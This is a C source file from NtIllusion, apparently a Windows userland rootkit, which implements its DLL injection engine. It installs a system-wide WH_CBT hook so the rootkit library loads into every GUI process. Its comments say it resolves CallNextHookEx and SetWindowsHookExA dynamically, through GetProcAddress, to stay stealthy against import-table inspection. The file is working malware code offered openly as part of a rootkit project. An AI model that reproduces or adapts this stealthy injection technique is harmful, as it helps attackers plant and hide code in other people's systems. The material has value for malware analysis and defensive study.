/******************************************************************************
  kSetWindowsHook.c	: Contains functions to set the system hook 
					  (injection engine)
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#define NTILLUSION_EXPORTS
#include <windows.h>
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"
#include "kSetWindowsHook.h"

// Use dynamic linking to be more stealth if Dll import table is dumped
FARPROC fCallNextHookEx=NULL;
FARPROC fSetWindowsHookEx=NULL;
HHOOK hHook=0;
extern HINSTANCE hDllInst;
extern FARPROC fGetProcAddress;
extern FARPROC fLoadLibrary;
extern char *kNTIDllName;

//		HookProc : used by the hook - *required*, but we don't use it
KNTILLUSION_API LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{

	// Get real address using GetProcAddress to prevent direct linkage to the dll/function (stealth)
	if(!fCallNextHookEx) {
		fCallNextHookEx = (FARPROC) fGetProcAddress(GetModuleHandle("user32.dll"),"CallNextHookEx");
		if(!fCallNextHookEx) return 0;
	}
    return fCallNextHookEx( hHook, nCode, wParam, lParam); 

}

//		InstallHook : used to set the hook : *required*
KNTILLUSION_API int InstallHook() 
{
	HINSTANCE hUser32=0;
	OutputString("InstallHook...\n");
	// Get real address using GetProcAddress to prevent direct linkage to the dll/function (stealth)
	if(!fSetWindowsHookEx) 
	{
		hUser32 = GetModuleHandle("user32.dll");
		if(!hUser32)
			hUser32 = LoadLibrary("user32.dll");
		if(!hUser32)
			OutputString("!hUser32...\n");

		fSetWindowsHookEx = (FARPROC) fGetProcAddress(hUser32,"SetWindowsHookExA");
		if(!fSetWindowsHookEx)
		{
			OutputString("!fSetWindowsHookEx...\n");
			return 0;
		}
	}
	OutputString("fSetWindowsHookEx...\n");
	//hHook = (HHOOK)fSetWindowsHookEx(WH_CBT, (HOOKPROC)HookProc, (HINSTANCE)GetModuleHandle(kNTIDllName), 0 ); 
	hHook = (HHOOK)fSetWindowsHookEx(WH_CBT, (HOOKPROC)HookProc, hDllInst, 0 ); 
	
	return ((hHook!=0)?1:0);
}

//		SetUpHook : install the hook and tells the debugger
KNTILLUSION_API int SetUpHook()
{
	
    int retv=0;
	
	OutputString("Setting up the hook...\n");
    
	retv = InstallHook();

    if(retv)
	{
		OutputString("* Hook installed\n");
//		Output2LogFile("* Hook installed");
    } 
	else 
	{
		OutputString("* [X] Cannot set up the hook\n");
//		Output2LogFile("[X] Cannot set up the hook");

	}
	
	return retv;
}